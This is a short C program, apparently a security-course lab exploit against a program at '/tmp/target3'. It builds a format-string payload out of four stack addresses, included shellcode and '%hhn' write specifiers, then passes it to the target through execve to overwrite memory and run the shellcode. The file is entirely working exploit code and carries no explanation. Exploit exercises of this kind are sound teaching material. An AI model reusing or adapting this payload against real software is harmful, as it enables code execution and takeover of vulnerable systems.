#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
	
	char arg1[352];
	sprintf(arg1, "\x54\xfd\xff\xbeZZZZ\x55\xfd\xff\xbeZZZZ\x56\xfd\xff\xbeZZZZ\x57\xfd\xff\xbe%s", shellcode);
	memcpy(arg1+28+strlen(shellcode), "%203x%hhn%240x%hhn%259x%hhn%191x%hhn", 36);
	
	arg1[351] = '\0';
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
